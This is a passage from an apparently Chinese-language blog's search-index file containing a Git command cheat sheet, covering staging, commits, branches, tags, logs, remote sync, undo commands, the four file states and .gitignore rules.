[--global] user.email <span class="hljs-string">&quot;[email address]&quot;</span></span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> Git配置文件路径</span>Git 系统配置文件 X:\Git\etc\gitconfig       (X为自己安装git的盘符)Git 用户配置文件 C:\Users\当前登录用户\.gitconfig</code></pre></div><h2 id="增加-删除文件"><a href="#增加-删除文件" class="headerlink" title="增加/删除文件"></a>增加/删除文件</h2><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 添加指定文件到暂存区</span><span class="hljs-meta">$</span><span class="bash"> git add [file1] [file2] ...</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 添加指定目录到暂存区，包括子目录</span><span class="hljs-meta">$</span><span class="bash"> git add [dir]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 添加当前目录的所有文件到暂存区</span><span class="hljs-meta">$</span><span class="bash"> git add .</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 添加每个变化前，都会要求确认</span><span class="hljs-meta">#</span><span class="bash"> 对于同一个文件的多处变化，可以实现分次提交</span><span class="hljs-meta">$</span><span class="bash"> git add -p</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 删除工作区文件，并且将这次删除放入暂存区</span><span class="hljs-meta">$</span><span class="bash"> git rm [file1] [file2] ...</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 停止追踪指定文件，但该文件会保留在工作区</span><span class="hljs-meta">$</span><span class="bash"> git rm --cached [file]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 改名文件，并且将这个改名放入暂存区</span><span class="hljs-meta">$</span><span class="bash"> git mv [file-original] [file-renamed]</span></code></pre></div><h2 id="代码提交"><a href="#代码提交" class="headerlink" title="代码提交"></a>代码提交</h2><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 提交暂存区到仓库区</span><span class="hljs-meta">$</span><span class="bash"> git commit -m [message]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 提交暂存区的指定文件到仓库区</span><span class="hljs-meta">$</span><span class="bash"> git commit [file1] [file2] ... -m [message]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 提交工作区自上次commit之后的变化，直接到仓库区</span><span class="hljs-meta">$</span><span class="bash"> git commit -a</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 提交时显示所有diff信息</span><span class="hljs-meta">$</span><span class="bash"> git commit -v</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 使用一次新的commit，替代上一次提交</span><span class="hljs-meta">#</span><span class="bash"> 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span><span class="hljs-meta">$</span><span class="bash"> git commit --amend -m [message]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 重做上一次commit，并包括指定文件的新变化</span><span class="hljs-meta">$</span><span class="bash"> git commit --amend [file1] [file2] ...</span></code></pre></div><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 列出所有本地分支</span><span class="hljs-meta">$</span><span class="bash"> git branch</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 列出所有远程分支</span><span class="hljs-meta">$</span><span class="bash"> git branch -r</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 列出所有本地分支和远程分支</span><span class="hljs-meta">$</span><span class="bash"> git branch -a</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 新建一个分支，但依然停留在当前分支</span><span class="hljs-meta">$</span><span class="bash"> git branch [branch-name]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 新建一个分支，并切换到该分支</span><span class="hljs-meta">$</span><span class="bash"> git checkout -b [branch]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 新建一个分支，指向指定commit</span><span class="hljs-meta">$</span><span class="bash"> git branch [branch] [commit]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 新建一个分支，与指定的远程分支建立追踪关系</span><span class="hljs-meta">$</span><span class="bash"> git branch --track [branch] [remote-branch]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 切换到指定分支，并更新工作区</span><span class="hljs-meta">$</span><span class="bash"> git checkout [branch-name]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 切换到上一个分支</span><span class="hljs-meta">$</span><span class="bash"> git checkout -</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 建立追踪关系，在现有分支与指定的远程分支之间</span><span class="hljs-meta">$</span><span class="bash"> git branch --set-upstream [branch] [remote-branch]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 合并指定分支到当前分支</span><span class="hljs-meta">$</span><span class="bash"> git merge [branch]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 选择一个commit，合并进当前分支</span><span class="hljs-meta">$</span><span class="bash"> git cherry-pick [commit]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 删除分支</span><span class="hljs-meta">$</span><span class="bash"> git branch -d [branch-name]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 删除远程分支</span><span class="hljs-meta">$</span><span class="bash"> git push origin --delete [branch-name]</span><span class="hljs-meta">$</span><span class="bash"> git branch -dr [remote/branch]</span></code></pre></div><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 列出所有tag</span><span class="hljs-meta">$</span><span class="bash"> git tag</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 新建一个tag在当前commit</span><span class="hljs-meta">$</span><span class="bash"> git tag [tag]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 新建一个tag在指定commit</span><span class="hljs-meta">$</span><span class="bash"> git tag [tag] [commit]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 删除本地tag</span><span class="hljs-meta">$</span><span class="bash"> git tag -d [tag]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 删除远程tag</span><span class="hljs-meta">$</span><span class="bash"> git push origin :refs/tags/[tagName]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 查看tag信息</span><span class="hljs-meta">$</span><span class="bash"> git show [tag]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 提交指定tag</span><span class="hljs-meta">$</span><span class="bash"> git push [remote] [tag]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 提交所有tag</span><span class="hljs-meta">$</span><span class="bash"> git push [remote] --tags</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 新建一个分支，指向某个tag</span><span class="hljs-meta">$</span><span class="bash"> git checkout -b [branch] [tag]</span></code></pre></div><h2 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h2><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 显示有变更的文件</span><span class="hljs-meta">$</span><span class="bash"> git status</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示当前分支的版本历史</span><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">log</span></span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示commit历史，以及每次commit发生变更的文件</span><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">log</span> --<span class="hljs-built_in">stat</span></span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 搜索提交历史，根据关键词</span><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">log</span> -S [keyword]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示某个commit之后的所有变动，每个commit占据一行</span><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">log</span> [tag] HEAD --pretty=format:%s</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示某个commit之后的所有变动，其<span class="hljs-string">&quot;提交说明&quot;</span>必须符合搜索条件</span><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">log</span> [tag] HEAD --grep feature</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示某个文件的版本历史，包括文件改名</span><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">log</span> --follow [file]</span><span class="hljs-meta">$</span><span class="bash"> git whatchanged [file]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示指定文件相关的每一次diff</span><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">log</span> -p [file]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示过去5次提交</span><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">log</span> -5 --pretty --oneline</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示所有提交过的用户，按提交次数排序</span><span class="hljs-meta">$</span><span class="bash"> git shortlog -sn</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示指定文件是什么人在什么时间修改过</span><span class="hljs-meta">$</span><span class="bash"> git blame [file]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示暂存区和工作区的差异</span><span class="hljs-meta">$</span><span class="bash"> git diff</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示暂存区和上一个commit的差异</span><span class="hljs-meta">$</span><span class="bash"> git diff --cached [file]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示工作区与当前分支最新commit之间的差异</span><span class="hljs-meta">$</span><span class="bash"> git diff HEAD</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示两次提交之间的差异</span><span class="hljs-meta">$</span><span class="bash"> git diff [first-branch]...[second-branch]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示今天你写了多少行代码</span><span class="hljs-meta">$</span><span class="bash"> git diff --shortstat <span class="hljs-string">&quot;@&#123;0 day ago&#125;&quot;</span></span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示某次提交的元数据和内容变化</span><span class="hljs-meta">$</span><span class="bash"> git show [commit]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示某次提交发生变化的文件</span><span class="hljs-meta">$</span><span class="bash"> git show --name-only [commit]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示某次提交时，某个文件的内容</span><span class="hljs-meta">$</span><span class="bash"> git show [commit]:[filename]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示当前分支的最近几次提交</span><span class="hljs-meta">$</span><span class="bash"> git reflog</span></code></pre></div><h2 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a>远程同步</h2><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 下载远程仓库的所有变动</span><span class="hljs-meta">$</span><span class="bash"> git fetch [remote]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示所有远程仓库</span><span class="hljs-meta">$</span><span class="bash"> git remote -v</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 显示某个远程仓库的信息</span><span class="hljs-meta">$</span><span class="bash"> git remote show [remote]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 增加一个新的远程仓库，并命名</span><span class="hljs-meta">$</span><span class="bash"> git remote add [shortname] [url]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 取回远程仓库的变化，并与本地分支合并</span><span class="hljs-meta">$</span><span class="bash"> git pull [remote] [branch]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 上传本地指定分支到远程仓库</span><span class="hljs-meta">$</span><span class="bash"> git push [remote] [branch]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 强行推送当前分支到远程仓库，即使有冲突</span><span class="hljs-meta">$</span><span class="bash"> git push [remote] --force</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 推送所有分支到远程仓库</span><span class="hljs-meta">$</span><span class="bash"> git push [remote] --all</span></code></pre></div><h2 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h2><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 恢复暂存区的指定文件到工作区</span><span class="hljs-meta">$</span><span class="bash"> git checkout [file]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 恢复某个commit的指定文件到暂存区和工作区</span><span class="hljs-meta">$</span><span class="bash"> git checkout [commit] [file]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 恢复暂存区的所有文件到工作区</span><span class="hljs-meta">$</span><span class="bash"> git checkout .</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</span><span class="hljs-meta">$</span><span class="bash"> git reset [file]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 重置暂存区与工作区，与上一次commit保持一致</span><span class="hljs-meta">$</span><span class="bash"> git reset --hard</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</span><span class="hljs-meta">$</span><span class="bash"> git reset [commit]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</span><span class="hljs-meta">$</span><span class="bash"> git reset --hard [commit]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 重置当前HEAD为指定commit，但保持暂存区和工作区不变</span><span class="hljs-meta">$</span><span class="bash"> git reset --keep [commit]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 新建一个commit，用来撤销指定commit</span><span class="hljs-meta">#</span><span class="bash"> 后者的所有变化都将被前者抵消，并且应用到当前分支</span><span class="hljs-meta">$</span><span class="bash"> git revert [commit]</span>暂时将未提交的变化移除，稍后再移入<span class="hljs-meta">$</span><span class="bash"> git stash</span><span class="hljs-meta">$</span><span class="bash"> git stash pop</span></code></pre></div><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 生成一个可供发布的压缩包</span><span class="hljs-meta">$</span><span class="bash"> git archive</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">生成SSH密钥</span><span class="hljs-meta">$</span><span class="bash"> ssh-keygen -t rsa</span></code></pre></div><h1 id="4-Git文件操作"><a href="#4-Git文件操作" class="headerlink" title="4. Git文件操作"></a>4. Git文件操作</h1><h2 id="文件4种状态"><a href="#文件4种状态" class="headerlink" title="文件4种状态"></a>文件4种状态</h2><ul><li>Untracked : 未跟踪 , 此文件在文件夹中 , 但没有加入git库 , 不参与版本控制 ,<ul><li>通过<code>git add</code>状态变为<code>Staged</code></li></ul></li><li>Unmodify : 文件已入库,未修改,即版本库中文件快照内容与文件夹完全一致,<ul><li>如果文件内容修改.状态变为<code>Modified</code></li><li>如果使用<code>git rm</code>移出版本库,则状态变为<code>UNtrackEd</code></li></ul></li><li>Modified : 文件已修改,<ul><li>使用<code>git add</code>可进入暂存<code>staged</code>状态</li><li>使用<code>git checkout</code>则放弃修改,返回到<code>Unmodify</code>状态</li></ul></li><li>Staged : 暂存状态<ul><li>使用<code>git commit</code>则将修改同步到库中,状态变为<code>Unmodify</code></li><li>使用<code>git reset HEAD [filename]</code>取消暂存,状态为<code>Modified</code></li></ul></li></ul><h2 id="忽略文件"><a href="#忽略文件" class="headerlink" title="忽略文件"></a>忽略文件</h2><p>在主目录下建立<code>.gitignore</code>文件,此文件可以选择忽略某些文件不参与文件推送,并且此文件有如下规则</p><ul><li>文件的空行和井号(#)开头的行会被忽略</li><li>Linux通配符 :<ul><li> 星号( * )代表多个字符</li><li> 问号( ? )代表一个字符</li><li> 方括号 [abc] 代表可选字符范围</li><li>大括号 (string1.string2) 代表可选的字符串</li></ul></li><li>文件名前面加!表示例外,不被忽略</li><li>文件名前面加路径分隔符( / ) , 表示忽略的文件在此目录下,而子目录中的文件不忽略</li><li>文件名后面加路径分隔符( / ) , 表示忽略的是此目录下该名称的子目录</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
